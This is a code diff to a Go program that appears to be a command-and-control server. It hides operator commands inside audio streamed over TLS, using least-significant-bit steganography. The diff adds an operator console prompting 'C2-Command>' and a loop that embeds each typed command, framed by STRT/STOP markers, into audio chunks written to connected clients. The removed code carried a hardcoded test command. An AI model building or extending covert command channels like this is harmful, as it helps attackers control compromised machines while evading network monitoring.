@@ -12,6 +12,8 @@ import (
 	"crypto/tls"
 	"flag"
 	"strconv"
+	"bufio"
+	"strings"
 
 )
 
@@ -23,7 +25,10 @@ var bufPool = sync.Pool{
 }
 
 const c2_server_ip = "0.0.0.0"
-var echo_to_stdout string
+var (
+	echo_to_stdout string
+	cliMessageChan = make(chan string, 10)
+)
 
 /*var http_response_string = "HTTP/1.1 200 OK\r\n" +
 	"Date: Wed, 29 Jul 2026 22:30:00 GMT\r\n" +
@@ -91,52 +96,85 @@ func invokeTlsListener(ctx context.Context, port string){
 			//576 Provides a precise 2ms network loop cadence
 			//need to decide if we wanna encode on header or not, if not so and need a way to determine if the chunk is, infact header
 			ChunkSize := 576 
+			byteOffset := 0
+			loopCounter :=0
+			totalTrackBytes := len(baseAudioTrack)
 			chunk := make([]byte, ChunkSize)
-
-			copy(chunk, baseAudioTrack[:ChunkSize])
-
-			//*********--encode message in the current chunk--******************//
-			//---code for byte to bit conversion
-			cmd:= "ls -la befo*"
-			command := "STRT"+cmd+"STOP"
-			var cmd_bitstring []string 
-
-			for _, char := range command{
-				fmt.Println("individual byte= ", char, " char= ", string(char)," bitstring ", fmt.Sprintf("%08b", char) )
-				cmd_bitstring = append(cmd_bitstring, fmt.Sprintf("%08b", char))
-			}
-			
-			//----code to inject LSB from cmd_bitstring array into audio stream.
-			cmd_bitIndex :=0
-			cmd_charIndex :=0
-			var audio_stegd_bytes []byte
-
-			fmt.Println("Chunk length = ", len(chunk))
-			if len(chunk) < len(command)*8{ fmt.Println("Need bigger chunks"); return}
-
-			for _, aud_byte := range chunk{
-				if cmd_charIndex == len(command) {
-					fmt.Println("stegged bs length ",len(audio_stegd_bytes), "\nstegged bs ", audio_stegd_bytes)
-					break
+			//cmd:= ""
+			for { //loopCounter<1 { //loop over baseAudioTrack, 1 ChunkSize at a time
+				//fmt.Println("Debug info - loopCounter = ", loopCounter, " totalTrackBytes = ", totalTrackBytes," byteOffset = ", byteOffset)
+				
+				// Boundary Check: If we reach the end of the file, reset pointer and increment loop
+				if byteOffset+ChunkSize > totalTrackBytes {
+					byteOffset = 0
+					loopCounter++
+					//if echo_to_stdout == "on" {
+					//	fmt.Printf("[Server Tracking] Track looped. Now entering Loop #%d\n", loopCounter)
+					//}
 				}
 
-				ival, _ := strconv.Atoi(string(cmd_bitstring[cmd_charIndex][cmd_bitIndex]))
-				aud_byte = aud_byte & 0xFE //0xFE is 11111110. So we clear the LSB
-				aud_byte = aud_byte | byte(ival)
+				copy(chunk, baseAudioTrack[byteOffset:byteOffset+ChunkSize])
 
-				audio_stegd_bytes= append(audio_stegd_bytes, aud_byte)
-
-				cmd_bitIndex++
-				if cmd_bitIndex==8{
-					cmd_charIndex ++
-					cmd_bitIndex =0
+				//*********--encode message in the current chunk--******************//
+				//---code for byte to bit conversion
+				cmd:= ""
+				
+				select {
+				case msg := <-cliMessageChan:
+					if len(msg) > 0 {
+						cmd = msg
+						fmt.Printf("[Server Steg] Injecting covert payload (%d characters)...\n", len(msg))
+					}
+				default:
+					//dont go through the whole thing of encoding, if we dont have any message to be sent.
+					c.Write(chunk)
+					byteOffset = byteOffset + ChunkSize;
+					continue
 				}
 
-			}
+				command := "STRT"+cmd+"STOP"
+				var cmd_bitstring []string 
 
-			//*********-------------------end------------------*****************//
-			copy(chunk[:cmd_charIndex*8], audio_stegd_bytes[:cmd_charIndex*8])
-			c.Write(chunk)
+				for _, char := range command{
+					fmt.Println("individual byte= ", char, " char= ", string(char)," bitstring ", fmt.Sprintf("%08b", char) )
+					cmd_bitstring = append(cmd_bitstring, fmt.Sprintf("%08b", char))
+				}
+				
+				//----code to inject LSB from cmd_bitstring array into audio stream.
+				cmd_bitIndex :=0
+				cmd_charIndex :=0
+				var audio_stegd_bytes []byte
+
+				fmt.Println("Chunk length = ", len(chunk))
+				if len(chunk) < len(command)*8{ fmt.Println("Need bigger chunks"); return}
+
+				for _, aud_byte := range chunk{
+					if cmd_charIndex == len(command) {
+						fmt.Println("stegged bs length ",len(audio_stegd_bytes), "\nstegged bs ", audio_stegd_bytes)
+						break
+					}
+
+					ival, _ := strconv.Atoi(string(cmd_bitstring[cmd_charIndex][cmd_bitIndex]))
+					aud_byte = aud_byte & 0xFE //0xFE is 11111110. So we clear the LSB
+					aud_byte = aud_byte | byte(ival)
+
+					audio_stegd_bytes= append(audio_stegd_bytes, aud_byte)
+
+					cmd_bitIndex++
+					if cmd_bitIndex==8{
+						cmd_charIndex ++
+						cmd_bitIndex =0
+					}
+
+				}
+
+				//*********-------------------end------------------*****************//
+				//need logic to copy below line, like check if cmd_charIndex has value, or audio_stegd_bytes is not nil
+				copy(chunk[:cmd_charIndex*8], audio_stegd_bytes[:cmd_charIndex*8])
+				c.Write(chunk)
+				byteOffset = byteOffset + ChunkSize
+				cmd = ""
+			}//for loop, looping over audioTrack, one chunkSize at a time.
 
 			fmt.Println("Log - ",time.Now()," Request recieved and Replied to ", port)
 		}(conn)
@@ -167,6 +205,8 @@ func main() {
 	ctx, cancel := context.WithCancel(context.Background())
 	var wg sync.WaitGroup
 	
+	go StartCLIConsole()
+
 	for _, port := range port_list{
 		wg.Add(1)
 		go func (p string){
@@ -185,4 +225,31 @@ func main() {
 	cancel()   // tell listeners to stop
 	wg.Wait()  // wait for them to actually close
 	fmt.Println("shutdown complete")
+}
+
+// StartCLIConsole accepts asynchronous text inputs from operators
+func StartCLIConsole() {
+	scanner := bufio.NewScanner(os.Stdin)
+	fmt.Println("[Console] Operator dynamic C2 link active. Type a command and press Enter:")
+	for {
+		fmt.Print("C2-Command> ")
+		
+		//read until a newline (\n)
+		if scanner.Scan() {
+			input := scanner.Text()
+
+			//Clean up whitespaces in the start and end, if any
+			input = strings.TrimSpace(input)
+
+			if input != "" {
+				cliMessageChan <- input
+			}
+		}
+
+		// Handle EOF-type errors
+		if err := scanner.Err(); err != nil {
+			fmt.Fprintln(os.Stderr, "reading standard input:", err)
+			return
+		}
+	}
 }
